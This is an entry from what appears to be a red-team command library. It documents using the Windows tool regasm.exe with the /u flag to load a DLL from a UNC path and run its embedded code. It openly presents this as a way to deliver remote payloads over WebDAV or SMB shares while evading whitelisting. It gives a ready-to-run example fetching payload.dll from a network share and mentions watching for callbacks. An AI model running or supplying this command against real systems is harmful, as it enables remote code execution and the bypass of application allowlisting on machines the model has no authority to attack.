---
id: e7b2f298-18fa-4503-b739-c83db741904f
name: regasm-unregister-unc-dll
type: command
executor: cmd
data: 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u $_UNC_PATH'
output: null
created_at: '2023-04-06T03:56:26.928422+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - execution
  - dotnet
  - bypass
verified: true
validated: true
---

# regasm-unregister-unc-dll

## Command

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u $_UNC_PATH
```

## Description

This command uses Regasm.exe to unregister a .NET assembly from a UNC path, which loads the DLL into memory and executes any embedded code (e.g., in static constructors). Use this to deliver remote payloads via WebDAV or SMB shares while evading whitelisting.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_UNC_PATH | UNC path to the malicious DLL (e.g., \\webdavserver\folder\payload.dll) | Yes |
| /u | Unregister flag; loads the assembly for processing | Built-in |
| Path to regasm.exe | Full path to Regasm (use Framework for 32-bit, Framework64 for 64-bit) | Yes |

## Examples

### Basic Usage

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\192.168.1.100\share\payload.dll
```

### 32-bit Variant

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /u $_UNC_PATH
```

## Expected Output

Successful execution shows:

```
Microsoft .NET Framework Registration Tool (Regasm.exe) v4.0.30319.0
Types unregistered successfully.
```

Errors may indicate path issues or access denied. Payload execution is silent unless it produces output (e.g., MessageBox); monitor network for callbacks.

## Related

- [[procedures/Regasm-Unregister-to-Execute-Payload-DLL]]
- [[techniques/Regsvcs/Regasm|T1121 - Regsvcs/Regasm]]
